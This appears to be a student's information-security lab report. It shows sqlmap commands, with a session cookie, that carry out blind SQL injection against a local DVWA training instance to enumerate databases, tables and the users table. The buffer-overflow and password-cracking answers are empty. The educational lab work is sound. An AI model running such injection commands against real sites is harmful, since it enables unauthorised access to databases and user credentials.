# Lab #1,22110085, Nguyen Truong, INSE330380E_01FIE
# Task 1: Software buffer overflow attack

**Question 1**:



# Task 2: Attack on database of DVWA

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
## Getting all databases:
Set up the database for DVWA and go to the webiste
In SQL Injection Blind Type in UserID then save the URL
<img src="https://github.com/letmehear159/IS-Lab/blob/master/image1.png" alt="screenShot"><br>

Then open the developerMod and copy the Cookie of the website:
<img src="https://github.com/letmehear159/IS-Lab/blob/master/Cookie.png" alt="screenShot"><br>
Open SqlMap and starting getting information about all databases : 
Running injection code :
```sh
python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=efp6tollc8ushf113hl3b4b155" --dbs
```
<img src="https://github.com/letmehear159/IS-Lab/blob/master/database.png" alt="screenShot"><br>

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
## Getting all tables:
Running injection code :
```sh
python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=efp6tollc8ushf113hl3b4b155" --tables
```
<img src="https://github.com/letmehear159/IS-Lab/blob/master/tables.png" alt="screenShot"><br>
## Getting all users information:
Running injection code :
```sh
python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=efp6tollc8ushf113hl3b4b155" --columns -T users --batch
```
<img src="https://github.com/letmehear159/IS-Lab/blob/master/users.png" alt="screenShot"><br>
**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
